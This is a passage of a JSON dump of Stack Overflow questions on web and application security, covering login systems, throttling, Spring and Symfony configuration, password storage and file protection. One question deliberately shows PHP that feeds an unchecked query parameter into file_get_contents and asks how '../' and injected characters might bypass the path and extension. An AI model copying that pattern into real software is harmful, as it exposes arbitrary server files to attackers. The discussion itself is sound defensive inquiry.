versa?</p>\n"},{"tags":["security","login","sso","dns"],"answer_count":5,"favorite_count":29,"up_vote_count":16,"down_vote_count":0,"view_count":7089,"score":16,"question_id":342378,"title":"Cross Domain Login - How to login a user automatically when transferred from one domain to another","body":"<p>We offer a number of online services. We are required to develop a system which provides a quick/simple experience for users if they are transferred from one service (on <code>domain1.com</code>) to another service (on <code>domain2.com</code>).</p>\n\n<p>Is there a safe and secure way to automatically login a user automatically once he has been transferred to the new service?</p>\n\n<p>Yell at me if the solution below is completely insecure/wrong.</p>\n\n<p>We were considering a system similar to that provided by a number of online services for password recovery - they are emailed a link with a unique hash which expires, that allows them to change their password.</p>\n\n<p>The <code>domain1.com</code> would generate a unique hash and store it in a database with the hash linked to a user along with an expire datetime field.</p>\n\n<p>The user will be transferred to <code>domain2.com/auto/?hash=d41d8cd98f00b204e9800998ecf8427e</code></p>\n\n<p><code>domain2.com</code> would next make a request to <code>domain1.com</code> with the hash to get the information about the user. <code>domain1.com</code> would then remove the hash from the database. <code>domain2.com</code> would log the user in and set cookie etc.</p>\n\n<p>Could something based on OpenID or OAuth achieve the same results?</p>\n\n\n"},{"tags":["php","security","web-security","throttling","honeypot"],"answer_count":11,"favorite_count":23,"up_vote_count":20,"down_vote_count":0,"view_count":5983,"score":20,"question_id":2090910,"title":"How can I throttle user login attempts in PHP","body":"<p>I was just reading this post <a href=\"http://stackoverflow.com/questions/549/the-definitive-guide-to-website-authentication-beta#477585\">http://stackoverflow.com/questions/549/the-definitive-guide-to-website-authentication-beta#477585</a> on Preventing Rapid-Fire Login Attempts.  </p>\n\n<p>Best practice #1: A short time delay that increases with the number of failed attempts,   like:  </p>\n\n<p>1 failed attempt = no delay<br>\n2 failed attempts = 2 sec delay<br>\n3 failed attempts = 4 sec delay<br>\n4 failed attempts = 8 sec delay<br>\n5 failed attempts = 16 sec delay<br>\netc.  </p>\n\n<p>DoS attacking this scheme would be very impractical, but on the other hand, potentially devastating, since the delay increases exponentially.  </p>\n\n<p><strong>I am curious how I could implement something like this for my login system in PHP?</strong>  </p>\n"},{"tags":[".net","wcf","security","logging","serialization"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":57,"score":3,"question_id":12547687,"title":"Personally Identifiable Information (PII), Traces, and MessageLogging","body":"<p><a href=\"http://msdn.microsoft.com/en-us/library/ms730318%28v=vs.100%29.aspx\" rel=\"nofollow\">MSDN talks about how credit card information could accidentally be logged during traces</a>.  But that same article explains that \"known\" Personally Identifiable Information is not logged.  </p>\n\n<p>What I'd like to know is if there is a way to 'flag' members of a DataContract as PII, to take advantage of the .net built-on capability of filtering out PII from traces and logs?  I'm thinking the answer is \"no,\" because the user names and passwords the article references I suspect are part of authentication steps, rather than part of data contracts that follow authentication.</p>\n\n<p>Even so, is there any kind of built-in .net attribute I can annotate a Data Contract or serializeable class members with, which means \"hey, this is a security sensitive attribute, beware!\"</p>\n"},{"tags":["security","url","hacking"],"answer_count":7,"favorite_count":2,"up_vote_count":14,"down_vote_count":0,"view_count":749,"score":14,"question_id":4833314,"title":"Are secret URLs truly secure?","body":"<p>I never leave backdoors in my system, but out of curiosity I was wondering if I left a secret URL like /x52d23r that allowed to bypass some sort of security, and this was only for my personal use---would that be somehow discovered by a third party without getting the information from me?</p>\n\n<p>For example, secret ports can be port scanned and fingerprinted, but can the same sort of tactic be done for secret URLs?</p>\n"},{"tags":["security","symfony2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12331757,"title":"How to get from symfony 2 the security.firewalls.secured_area?","body":"<p>how can i get from symfony 2 (security) this data's?</p>\n\n<pre><code>secured_area:\n        pattern: /.*\n        form_login:\n            check_path: /logstart\n            login_path: /login\n        logout: \n            path:   /logout\n            target: /login\n        remember_me:\n            key:      aSecretKey\n            lifetime: 3600\n            path:     /\n            domain:   ~\n</code></pre>\n"},{"tags":["ruby-on-rails","security","heroku","github"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12734495,"title":"Deploying with Heroku using a database.yaml file not in github repo","body":"<p>When pushing to Github, I want to .gitignore my database.yaml file so that I don't publically expose my production database password.  But I need that password to be available to Heroku for when the app is running in production.</p>\n\n<p>I could set environment variables in heroku, but that strikes me as unsecure.  Any able to get on my computer could run a single command in terminal and reveal the password variable.</p>\n\n<p>When dealing with Github and Heroku, it is possible to write code that specifies that certain files should be ignored when pushing to github but not ignored when pushing to heroku?</p>\n"},{"tags":["php","security","session","authentication","login"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":80,"score":-1,"question_id":12733503,"title":"Very simple authentication system in PHP?","body":"<p>I need to write a very simple login/authentication system in PHP so that I can protect some PHP files from unauthorized access. I don't need to allow new users to \"register\" or anything fancy like that; all I need to do is to assign a few people usernames and allow them to choose a password. I was thinking of the following:</p>\n\n<ol>\n<li>Assign the person a username.</li>\n<li>Have them go to a website that has a password hashing tool, like <a href=\"http://www.xorbin.com/tools/sha1-hash-calculator\" rel=\"nofollow\">this site</a>, and have them send me the hash which I would then put in the DB (this way I don't know what their password is).</li>\n<li>In my PHP files, use a <code>session</code> variable to check if the user is logged in or not, and if not then direct them to a login page.</li>\n<li>If they weren't logged in, then they fill out their username and password and if it's correct then I start a <code>session</code> for them.</li>\n<li>The user now has access to the php pages.</li>\n</ol>\n\n<p>Does that sound like a good plan? Would this authentication system be secure?</p>\n\n<p>Thanks for your advice.</p>\n"},{"tags":["security","publickey"],"answer_count":2,"favorite_count":1,"up_vote_count":19,"down_vote_count":0,"view_count":9686,"score":19,"question_id":2292495,"title":"What is the difference between a cer, pvk, and pfx file?","body":"<p>What is the difference between a cer, pvk, and pfx file?</p>\n\n<p>EDIT:</p>\n\n<p>Also, which files do I keep and which am I expected to give to my counter-parties?</p>\n"},{"tags":["security","report","system","virus","trust"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12728648,"title":"Virus that looks through a system and reports all it finds","body":"<p>I am doing a report on Information Security.</p>\n\n<p>Is there any such virus that 'acts' as input data to a software system, and then as it goes through different applications and systems, reports back to a third party about what's happening to it or what it can 'see' in the system?</p>\n\n<p>Just wondering because this will be very useful for my report.</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","html","security","authorization","protection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12731900,"title":"Protect Files from unauthorized access","body":"<p>I have this very big problem I've been trying to solve for last few days with no success. I have some files which are class schedules, these are imported to the server from an external source (html format). I need to block direct access to those files. They are displayed by PHP script. So, these are assumptions:\n-files displayed via php script\n-files cannot be modified in any way (html files)\n-there must be no direct access to those files\n-server is apache</p>\n\n<p>any ideas? I tried with htaccess, but I may be not competent enough, because it was blocking access to files for php script too.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["c#","asp.net","wcf","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":447,"score":2,"question_id":9614857,"title":"Error with PrincipalPermission authentication in WCF","body":"<p>I am following a <a href=\"http://www.pluralsight-training.net/microsoft/courses/TableOfContents?courseName=wcf-design-concepts&amp;highlight=aaron-skonnard_serialization%2a1\" rel=\"nofollow\">Pluralsight video on Authentication</a>.</p>\n\n<p>I am trying to add simple PrinciplePermission authentication to my web service:</p>\n\n<pre><code>    [PrincipalPermission(SecurityAction.Demand, Role = \"Computer\\\\Group\")]\n    public String testDBConnection()\n    {\n        return \"success\";  \n    }\n</code></pre>\n\n<p>In my WCF client I am sending:</p>\n\n<pre><code>    client.ClientCredentials.UserName.UserName = \"Alice\";\n    client.ClientCredentials.UserName.Password = \"alice\";\n</code></pre>\n\n<p>I have created the group and added Alice to it as per the video, but now....</p>\n\n<p>I keep getting the error:</p>\n\n<p><strong>\"Request for principal permission failed.\"</strong></p>\n\n<p>Any idea what's wrong?</p>\n"},{"tags":["php","security","injection"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12731547,"title":"Can an appended file suffix to a parameter for file_get_contents be bypassed?","body":"<p>Consider the following code</p>\n\n<pre><code>&lt;?php\n// warning: this code is unsafe and for demonstrational purposes only,\n// do not use in a production environment\n$filename = $_GET['filename']; \n$extension = 'txt';\n$path = '/absolute/path';\n$fullFilename = sprintf('%s/%s.%s', $path, $filename, $extension);\necho file_get_contents($fullFilename);\n</code></pre>\n\n<p>We all know (at least I hope so) that prepending an absolute path is by no way an adequate mean to prevent leaving the given path - one can simply insert one or more \"<code>../</code>\"s to the query string to reach any path on the file system.</p>\n\n<p><strong>My question is: Analogously to the given example, can <code>$_GET['filename']</code> also be manipulated in such a way that the given extension suffix can be bypassed as well</strong>, i.e. a file other than .txt is echoed? I'm especially thinking of certain control characters that bypass the appended file extension in the same fashion as <code>../</code> does with the prefix.</p>\n\n<p>I tried adding some control characters (e.g. ASCII code 127 for delete) to the query string or concatenating two filenames by using <code>&amp;&amp;</code>, <code>|</code> or <code>&gt;</code>, but all to no avail and I wondered if there exists such a possibility at all.</p>\n\n<p>(Btw, I'd like to add the note that this questions is not asked for the purpose to exploit a system. It's purely a hypothetical question that came across my mind recently.)</p>\n"},{"tags":["c#",".net","security"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12731030,"title":"CasPol equivalent for Net 4","body":"<p>With my Net 3.5 application, I had created some entries (using Caspol) to give FullTrust to StrongName assemblies that were signed by our company. This allowed the apps to run from  a network drive without any problems.</p>\n\n<p>Now I have updated the apps to Net 4.0 and would like to create entries (with Caspol???) to allow the apps to run from a network drive when the assemblies have been signed with a code signing certificate (as well as StrongName signing). Under Net 4, is this necessary? What is the syntax for creating Caspol generated permissions for assemblies that are signed (both for code signing certificates and StongName signing)?</p>\n\n<p>I have tried using:</p>\n\n<pre><code>[assembly: System.Security.SecurityRules(System.Security.SecurityRuleSet.Level1)]\n</code></pre>\n\n<p>but this does not solve my problem. Apparently some code is being executed that causes an exception (under Net3.5 this didn't happen)</p>\n\n<p>I have also tried: </p>\n\n<pre><code>&lt;configuration&gt;\n   &lt;runtime&gt;\n      &lt;NetFx40_LegacySecurityPolicy enabled=\"true\"/&gt;\n   &lt;/runtime&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>but my app will not even startup!</p>\n\n<p>TIA,\nMartin.</p>\n"},{"tags":["c#","security","ironpython","customclasses"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12721998,"title":"Secure and protect classes or DLLs in .NET from being used in IronPython","body":"<p>I want to use ironpython inside my C# App, but I am afraid that it will cause a security issue, I don't want the end user to use all the available DLLs of my App, instead I want to provide custom classes that user can use in python.</p>\n\n<p>My question is how to secure my dlls from being used in ironpython.\nthe end user may addReference of the dll, I want to secure most of the classes from being used.</p>\n\n<p>Thank you and regard.</p>\n"},{"tags":["security","plugins","add-on","review"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":1,"view_count":44,"score":0,"question_id":12729697,"title":"Security Code Review Tools","body":"<p>What are the recommended tools for <em>Security</em> Code Review? Can someone give me a review of tools he/she used or maybe a recommendation? </p>\n\n<p>I don't mean tools like Sonar + Findbugs or PMD that do static analysis, I mean software/IDE extensions that can support the manual review process (with focus on security) e.g. contextual code analysis.</p>\n\n<p>Thanks</p>\n"},{"tags":["ruby-on-rails","security","file","download"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12729046,"title":"Best way to set file-download permissions on Rails 3","body":"<p>I want to secure some files that are on my site, but also I want to give permissions to some users to download that files. What is the best way to do it? </p>\n\n<p>I have only one idea - generate temporary random URL's like <code>/files/hdad8fda299asnfqe/foo.bar</code></p>\n\n<p>But I hardly want that other users can not use others URLs.</p>\n\n<p>Do you know any gem that can help me or suggest another way to secure files?</p>\n"},{"tags":["java","flex","security","jboss","blazeds"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2861,"score":4,"question_id":1715296,"title":"Client.Error.MessageSend problem with Flex/BlazeDS on JBoss","body":"<p>I'm developing a Flex 3.4 app that interops with a Java EE backend running on a JBoss-4.2.2 server, through the most recent release of BlazeDS. When I ran the Flex app from Flash Builder 4 beta 2 on Tomcat, everything was fine, the Flex app was able to make the remote call needed. But my production environment is on JBoss, and when I moved the app to JBoss (with services-config.xml updated to fit JBoss), the Flex app keeps complaining Client.Error.MessageSend upon remote calls.\nAt first, when I manually deployed the app to JBoss, the faultDetail was <code>\"Channel.Security.Error error Error #2048 ... \"</code>; later I tried to run the app from Flash Builder, and then faultDetail became <code>\"Channel.Connect.Failed error NetConnection.Call.BadVersion\"</code>.</p>\n\n<p>In services-config.xml, under <code>&lt;security&gt;</code>, was:</p>\n\n<pre><code>&lt;login-command class=\"flex.messaging.security.TomcatLoginCommand\" server=\"Tomcat\"/&gt;\n</code></pre>\n\n<p>when moving to JBoss, I updated it to:</p>\n\n<pre><code>&lt;login-command class=\"flex.messaging.security.TomcatLoginCommand\" server=\"JBoss\"/&gt;\n</code></pre>\n\n<p>I have a crossdomain.xml placed in JBoss' deploy folder, as follows:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt; \n&lt;!DOCTYPE cross-domain-policy \n    SYSTEM \"http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd\"&gt; \n    &lt;cross-domain-policy&gt; \n    &lt;allow-access-from domain=\"*\" /&gt; \n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p>But looks like it doesn't work. I've also tried to put crossdomain.xml in deploy/xxxxx.war folder, and the problem remains.</p>\n\n<p>I'm using http://, not https://, so I guess it's not about security channel.</p>\n\n<p>Tried to search for a solution, but most solutions were PHP related, which wasn't really helpful. Any one got any clues?</p>\n"},{"tags":["spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":12701154,"title":"Spring Security Error Pages using Forward","body":"<p>I want to display a custom error page on authentication denial (I am using a pre-authenticated secnario) and also access denial from Spring Security 3.0.X</p>\n\n<p>Understand we can use the following to perform this:</p>\n\n<p></p>\n\n<p>\n        \n        \n    </p>\n\n<pre><code>&lt;beans:bean id=\"authenticationEntryPoint\" class=\"org.springframework.security.web.authentication.LoginUrlAuthenticationEntryPoint\"&gt;\n    &lt;beans:property name=\"loginFormUrl\" value=\"/error.jsp\"/&gt;\n&lt;/beans:bean&gt;\n\n&lt;beans:bean id=\"accessDeniedHandler\" class=\"org.springframework.security.web.access.AccessDeniedHandlerImpl\"&gt;\n    &lt;beans:property name=\"errorPage\" value=\"/error.jsp\"/&gt;\n&lt;/beans:bean&gt;\n</code></pre>\n\n<p>but doing this results in a redirect and not a forward to the error page. Anyway to perform forward to an error page (so that we can set some attributes in the request)</p>\n\n<p>Thanks </p>\n"},{"tags":["security","deployment","jetty","war"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12727339,"title":"Security error in WebAppContext jetty","body":"<blockquote>\n  <p>When trying to deploy war file in jetty using web app context, the following exception is thrown </p>\n  \n  <p>The code is as follows:</p>\n</blockquote>\n\n<pre><code>WebAppContext wac = new WebAppContext();\nwac.setContextPath(\"/MYSERVER\");\nwac.setWar(\"java-monitor.war\");\n</code></pre>\n\n<blockquote>\n  <p>I am using jetty 7.6.5 and i am not using org.mortbay i am using org.eclipse.jetty.webapp.WebAppContext;</p>\n  \n  <p>How to solve this problem?</p>\n</blockquote>\n\n<pre><code>Exception in thread \"main\" java.lang.NoClassDefFoundError: org/eclipse/jetty/security/ConstraintSecurityHandler\nat org.eclipse.jetty.servlet.ServletContextHandler.&lt;init&gt;(ServletContextHandler.java:75)\nat org.eclipse.jetty.servlet.ServletContextHandler.&lt;init&gt;(ServletContextHandler.java:106)\nat org.eclipse.jetty.servlet.ServletContextHandler.&lt;init&gt;(ServletContextHandler.java:94)\nat org.eclipse.jetty.webapp.WebAppContext.&lt;init&gt;(WebAppContext.java:170)\nCaused by: java.lang.ClassNotFoundException: org.eclipse.jetty.security.ConstraintSecurityHandler\nat java.net.URLClassLoader$1.run(URLClassLoader.java:202)\nat java.security.AccessController.doPrivileged(Native Method)\nat java.net.URLClassLoader.findClass(URLClassLoader.java:190)\nat java.lang.ClassLoader.loadClass(ClassLoader.java:306)\nat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)\nat java.lang.ClassLoader.loadClass(ClassLoader.java:247)\n... 5 more\n</code></pre>\n"},{"tags":["database","security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12724985,"title":"symfony2 authentification","body":"<p>I want to create SF2 authentification against a database, I used the officiel documentation of SF2, <a href=\"http://symfony.com/doc/2.0/cookbook/security/entity_provider.html\" rel=\"nofollow\">http://symfony.com/doc/2.0/cookbook/security/entity_provider.html</a>, the problem is that the check does not work, I don't know way, I didn't get any error, after entering the user information I still in same page /login, without errors, I don't really get it, If some one could help me I will greatful.</p>\n\n<p>security.yml</p>\n\n<pre><code>security:\nencoders:\n  TEST\\UserBundle\\Entity\\User:\n    algorithm: sha512\n    encode-as-base64: true\n    iterations: 10\n\n\nrole_hierarchy:\n    ROLE_ADMIN:       ROLE_USER\n    ROLE_SUPER_ADMIN: [ROLE_USER, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\nproviders:\n    main:\n        entity: { class: TESTUserBundle:User, property: username }\n\nfirewalls:\n    login:\n        pattern: ^/(login|reset|accueil)\n        anonymous: true\n    main:\n        pattern: /.*\n        form_login:\n            check_path: /check_login\n            login_path: /login\n        logout:\n            path: /logout\n            target: /login\n        security: true\n        anonymous: false\n\naccess_control:\n    #- { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY, requires_channel: https }\n    #- { path: ^/_internal, roles: IS_AUTHENTICATED_ANONYMOUSLY, ip: 127.0.0.1 }\n    #- { path: ^/admin, roles: ROLE_ADMIN }\n</code></pre>\n\n<p>the problem is that the error always null, this is my login form </p>\n\n<pre><code>            {% if error == 1 %}\n        &lt;span class=\"pw-alert\"&gt;E-mail et/ou mot de passe erron(s)&lt;/span&gt;\n        {% endif %}\n                &lt;form action=\"{{ path('_security_check_user') }}\" method=\"POST\"&gt;\n    &lt;div&gt;\n        &lt;label for=\"username\"&gt;Username:&lt;/label&gt;\n        &lt;input type=\"email\" id=\"username\" name=\"_username\" value=\"{{ last_username }}\" /&gt;\n    &lt;/div&gt;\n\n    &lt;div&gt;\n        &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n        &lt;input type=\"password\" id=\"password\" name=\"_password\" /&gt;\n    &lt;/div&gt;\n                    &lt;input type=\"submit\" value=\"Se connecter\" name=\"login\"/&gt;\n                &lt;/div&gt;\n\n            &lt;/form&gt;\n</code></pre>\n"},{"tags":["wpf","security","internet-explorer","configuration","xbap"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12376868,"title":"Turning off security messages for WPF XBAP applications in Internet Explorer","body":"<p>I'm developing a WPF XBAP application. When i try to open it in Internet Explorer (9.0.8112.16421 Update version 9.0.9 KB2722913, Windows 7) every time security warning is popped up. Twice. \n<img src=\"http://i.stack.imgur.com/bnG1V.png\" alt=\"Security warning\"></p>\n\n<p>That's very annoying and acceptable only in developer environment, there is a need to turn them both off. Project configuration is as follows : Security - \"Enable ClickOnce security settings\" (when its disabled application won't run at all) - \"This is a full trust application\"; \"Signing\" - \"Sign the ClickOne manifests\" (with test certificate which is imported to Trusted Root Certification Authorities). In IE both internet and intranet zones have \"WPF browsers applications\" set to \"Enable\" (that may not have effect because *.xbap is loaded from file system). In case I don't have alternative ways to integrate WPF application into browser (Silverlight is not an option, there is a requirement about full .NET framework targeting) i'm looking for solution of above described problem. Thanks in advance.</p>\n"},{"tags":["web-services","security","ssl","ssl-certificate","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":12725568,"title":"How to handle SSL server certificate in production?","body":"<p>I'm setting up SSL in my site for the first time and I wonder if there are any guidelines regarding the handling of certificates.</p>\n\n<p>What is the best practice regarding handling my SSL server certificate? Should it be put in source control? If not, where? Are there any Does and Don'ts I should follow?</p>\n"},{"tags":["security","http","tcp","port","firewall"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":12723882,"title":"Random ports being used by client machine to access a service","body":"<p>In a web server we need to open Port (default:80) in the Firewall to make website accessible from client machine. Now my question is about the client machine, client would be browsing the application using a browser, again it would be using a port from the client machine to send and receive data. when I run netstat command</p>\n\n<p>Proto:TCP| Local Address:local-ip:49393 | Foregin Address:stackoverflow:http | State:ESTABLISHED</p>\n\n<p>and I believe the port no changes for each request, and does that means ports in the client are open to public? and also is through the same port request and response is being send between server and client?</p>\n"},{"tags":["security","url"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":24,"score":-1,"question_id":12724868,"title":"Security issue! Make applications unreachable from outside","body":"<p>Im working with scriptcase,php code generator (hope anyone knows it) inwhich i create projects based on the pre-build forms of Scriptcase. Each application has it's own folder. Now..\nWhen i try to access the menu.php file directly from the url bar (ex: \n    <code>http://192.168.1.111/projectfolder/menu/menu.php</code>     ), it shows me a message \"unauthorised user\" since i haven't logged in. But when i try to access in the same way another file of the same project, i can open it right away! No login required! What i want is to protect all of my files, so outsides won't be able to access them without preregistration. How can i do it? I tried to deploy each application apart and have them assigned the login app as the initial app, in the deploy process..but no luck!</p>\n\n<p>What should i do??</p>\n\n<p>Looking forward to a response..\nAll the best</p>\n"},{"tags":["asp.net","security","asp-classic"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":80,"score":0,"question_id":12648698,"title":"Why are ASP.NET more secure than ASP Classic?","body":"<p>I've read several places that ASP.NET are more secure than ASP Classic. But never seen any actual arguments of why.</p>\n\n<p>Using a standard login system as an example.\nThe user sends a username and a password to the server via forms. This is done the same way in both languages. And in both languages the rest is done on the server.\nWhy choose ASP.NET over ASP Classic here?</p>\n"},{"tags":["database","security","passwords"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12722051,"title":"Store password in database","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/615704/preferred-method-of-storing-passwords-in-database\">Preferred Method of Storing Passwords In Database</a>  </p>\n</blockquote>\n\n\n\n<p>My problem is similar to this one discussed here: <a href=\"http://stackoverflow.com/questions/1054022/best-way-to-store-password-in-database\">Best way to store password in database</a></p>\n\n<p>I need to store passwords of external FTP logins in the database which will be used by the application. The solution of the linked topic is not applicable because it's hashing the password.</p>\n\n<p>I'm using C# and connecting to a SQL Server 2008. Does someone has an example solution? I think I just have to encrypt the password, store it in ecrypted form and if the application wants to use the password -> decrypt.</p>\n"},{"tags":["android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":172,"score":1,"question_id":9665411,"title":"Is it possible programmatically (on non rooted android phones) to check which servers(url) are the installed apps connecting to in the background?","body":"<p>Can a security app check what servers(urls) is another app is trying to connect? </p>\n\n<p>I know about android sandboxing but is there still a way using PackageManager or any other API/technique to get this piece of info programmatically using public SDK only, for Non Rooted android phones? </p>\n"},{"tags":["spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":144,"score":0,"question_id":11266878,"title":"Spring security - 404 error","body":"<p>Why when I add </p>\n\n<pre><code>     &lt;filter&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n</code></pre>\n\n<p>to my project it's not working and I get:  HTTP Status 404. But when I remove the filter dependency, it works again. </p>\n\n<p>Any idea why?  Why it cause the error? </p>\n\n<p>Here is my web.xml</p>\n\n<pre><code> &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n &lt;web-app xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:web=\"http://java.sun.com/xml/ns/javaee      /web-app_2_5.xsd\"\nxsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd\"\nversion=\"2.5\"&gt;\n\n\n&lt;!-- Define the basename for a resource bundle for I18N --&gt;\n&lt;context-param&gt;\n    &lt;param-name&gt;javax.servlet.jsp.jstl.fmt.localizationContext&lt;/param-name&gt;\n    &lt;param-value&gt;messages&lt;/param-value&gt;\n&lt;/context-param&gt;\n\n&lt;context-param&gt;\n    &lt;param-name&gt;contextClass&lt;/param-name&gt;\n    &lt;param-value&gt;org.springframework.web.context.support.AnnotationConfigWebApplicationContext\n    &lt;/param-value&gt;\n\n&lt;/context-param&gt;\n\n&lt;!-- Creates the Spring Container shared by all Servlets and Filters --&gt;\n&lt;listener&gt;\n    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n&lt;!-- The definition of the Root Spring Container shared by all Servlets \n    and Filters --&gt;\n&lt;context-param&gt;\n    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n    &lt;param-value&gt;\n        classpath:/META-INF/root-context.xml,\n        classpath:/META-INF/appServlet/spring-security.xml\n    &lt;/param-value&gt;\n\n&lt;/context-param&gt;\n\n&lt;!-- Processes application requests --&gt;\n&lt;servlet&gt;\n    &lt;servlet-name&gt;appServlet&lt;/servlet-name&gt;\n    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;\n    &lt;init-param&gt;\n        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;\n        &lt;param-value&gt;\n            classpath:/META-INF/appServlet/servlet-context.xml\n\n            &lt;/param-value&gt;\n    &lt;/init-param&gt;\n    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;\n&lt;/servlet&gt;\n&lt;servlet-mapping&gt;\n    &lt;servlet-name&gt;appServlet&lt;/servlet-name&gt;\n    &lt;url-pattern&gt;/&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;\n\n&lt;filter&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;\n&lt;/filter&gt;\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;springSecurityFilterChain&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n\n   &lt;/web-app&gt;\n</code></pre>\n\n<p>and here is my spring_security.xml</p>\n\n<pre><code>    &lt;beans:beans xmlns=\"http://www.springframework.org/schema/security\"\nxmlns:beans=\"http://www.springframework.org/schema/beans\" \nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxmlns:security=\"http://www.springframework.org/schema/security\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans-3.0.xsd\nhttp://www.springframework.org/schema/security\nhttp://www.springframework.org/schema/security/spring-security-3.0.3.xsd\"&gt;\n\n&lt;security:http auto-config=\"true\"&gt;\n    &lt;security:intercept-url pattern=\"/welcome*\" access=\"ROLE_USER\" /&gt;\n    &lt;security:form-login login-page=\"/login\" default-target-url=\"/welcome\"\n        authentication-failure-url=\"/loginfailed\" /&gt;\n    &lt;security:logout logout-success-url=\"/logout\" /&gt;\n&lt;/security:http&gt;\n\n&lt;security:authentication-manager&gt;\n    &lt;security:authentication-provider&gt;\n        &lt;security:jdbc-user-service data-source-ref=\"dataSource\"\n\n            users-by-username-query=\"\n                select username,password, enabled \n                from users where USERNAME=?\" \n\n            authorities-by-username-query=\"\n                select u.username, ur.authority from users u, user_roles ur \n                where u.user_id = ur.user_id and u.username =?  \" \n\n        /&gt;\n    &lt;/security:authentication-provider&gt;\n&lt;/security:authentication-manager&gt;\n\n   &lt;/beans:beans&gt;\n</code></pre>\n"},{"tags":["php","mysql","security"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":6,"view_count":425,"score":-3,"question_id":8721578,"title":"Where do I hide my login info when using PHP connect to get to a database?","body":"<p>I need to connect to a <code>mysql database</code> using <strong><code>PHP</code></strong>.  I am storing my login, user, password, and other info in a separate php file (let's say <code>\"mysql_connect.php\"</code>) and then accessing it via require_once <code>(mysql_connect.php)</code> in a different file.  </p>\n\n<p>I have done a bit of googling and I know that I am supposed to keep \"mysql_connect.php\" out of the web root.  I have moved it outside of the html folder and tried calling to it by using \"../../mysql_connect.php\"   This is not working, it gives me an error \"function not found\" or something like that.  Upon googling that, the internet says that its because it can't locate the file i'm referencing.  When I move mysql_connect.php into a folder below root, everything works fine.  The issue is because it is moved outside of the web root (i think).    </p>\n\n<p>I have been googling for two days now and cannot find a detailed explanation on how to get this to work.  Something about changing the .htaccess file?  I've read a bunch of articles on the theory but I am really looking for a step-by-step tutorial (I am a beginner).  The only step-by-step tutorials I can find just tell you to put the config.php file into the same folder which is not secure.  